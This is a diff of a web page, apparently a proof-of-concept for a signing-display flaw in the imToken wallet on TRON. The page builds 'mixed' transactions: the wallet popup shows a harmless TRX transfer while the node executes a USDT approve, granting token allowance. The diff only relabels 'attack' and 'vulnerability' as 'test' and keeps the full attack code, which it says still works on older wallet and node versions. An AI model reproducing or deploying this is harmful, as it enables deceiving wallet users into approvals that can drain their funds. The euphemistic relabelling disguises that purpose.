@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>imToken TRON 所见非所签漏洞研究与验证</title>
+  <title>imToken TRON 所见非所签安全测试与验证</title>
   <style>
     :root { --bg: #0b0f14; --card: #131a22; --border: #253040; --text: #e1e6ed; --text2: #8899aa; --red: #f04343; --orange: #e6a23c; --green: #2ecc71; --blue: #4d94ff; }
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -36,13 +36,13 @@
 <body>
 
   <div class="card">
-    <div class="card-header"><span class="dot red"></span> “所见非所签”攻击模型</div>
+    <div class=”card-header”><span class=”dot red”></span> “所见非所签”安全测试模型</div>
     <div style="font-size:13px; color:var(--text2); line-height:1.6;">
       ① <span class="highlight-green">普通 TRX 转账</span> — 验证 <code>tron.sendTransaction</code> 入口可用<br>
       ② <span class="highlight-green">原始 USDT approve</span> — 验证合约调用可正常上链<br>
-      ③ <span class="highlight-red">混合攻击</span> — 填充字段+数字键覆盖：弹窗显示转账，节点解析为 approve<br>
+      ③ <span class="highlight-red">混合测试</span> — 填充字段+数字键覆盖：弹窗显示转账，节点解析为 approve<br>
       <br>
-      攻击原理：同一个 contract 对象包含两套字段 — 字符串键给 imToken UI 读取，数字键给 java-tron 节点解析<br>
+      测试原理：同一个 contract 对象包含两套字段 — 字符串键给 imToken UI 读取，数字键给 java-tron 节点解析<br>
       <code>type</code>/<code>parameter</code> 显示 TRX 转账，数字键 <code>"1"</code>/<code>"2"</code> 覆盖为 TriggerSmartContract<br>
       <span style="color:var(--orange);">⚠️ 是否受影响取决于 imToken 版本和 java-tron 节点对数字字段号的支持。</span>
     </div>
@@ -63,7 +63,7 @@
       <div class="row"><span class="label">网络</span><span class="value">TRON 主网</span></div>
       <button class="btn btn-normal" id="btnNormal">① 普通 TRX 转账 (0.1 TRX)</button>
       <button class="btn btn-approve" id="btnApprove">② 原始 USDT approve (1 USDT)</button>
-      <button class="btn btn-mixed" id="btnMixed">③ 混合攻击：显示转账，实际授权</button>
+      <button class="btn btn-mixed" id="btnMixed">③ 混合测试：显示转账，实际授权</button>
       <button class="btn btn-check" id="btnCheckAllowance" style="margin-top:14px;">查询 USDT 授权额度</button>
       <button class="btn btn-check" id="btnDirectTest" style="margin-top:14px; background:#e6a23c; color:#000;">分离测试：直接广播</button>
     </div>
@@ -74,7 +74,7 @@
     <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
     <div class="row"><span class="label">变化</span><span class="value" id="allowanceChange">--</span></div>
     <div class="info-box">
-      若混合攻击后授权从 0 变为 1 USDT，则漏洞验证成功（需结合弹窗截图与 txid 作为完整证据）。
+      若混合测试后授权从 0 变为 1 USDT，则安全测试验证成功（需结合弹窗截图与 txid 作为完整证据）。
     </div>
   </div>
 
@@ -257,12 +257,12 @@
     } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
   }
 
-  // ③ 混合攻击：修改 raw_data 欺骗 UI，raw_data_hex 保持 approve
+  // ③ 混合测试：修改 raw_data 欺骗 UI，raw_data_hex 保持 approve
   // 当前 imToken 版本：弹窗能显示 TRX 转账，广播时 SIGERROR（签名与节点解析不一致）
-  // 低版本 imToken + java-tron 支持数字键时可通过，此页面保留完整攻击结构
+  // 低版本 imToken + java-tron 支持数字键时可通过，此页面保留完整测试结构
   async function mixedTx() {
     if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
-    log('构造混合攻击交易…', 'warn');
+    log('构造混合测试交易…', 'warn');
     try {
       const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
       const userHex = window.tronWeb.address.toHex(walletAddr);
@@ -326,7 +326,7 @@
       log(`[签名] raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
       log('━━━━━━━━━━━━━━━━━━━━', 'warn');
 
-      const ok = await sendTx(transaction, '混合攻击 (填充+数字键)');
+      const ok = await sendTx(transaction, '混合测试 (填充+数字键)');
       if (ok) {
         setTimeout(() => refreshAllowanceUI(false), 12000);
       } else {
@@ -385,7 +385,7 @@
 
       // 用 sendTransaction 走 imToken 签名
       log('先走 imToken sendTransaction…', 'warn');
-      const ok = await sendTx(transaction, '混合攻击 (手动JSON排序)');
+      const ok = await sendTx(transaction, '混合测试 (手动JSON排序)');
       if (!ok) {
         log('imToken 路径失败，尝试分离测试…', 'warn');
         // 分离测试：用 tronWeb 本地签名 + 直接广播
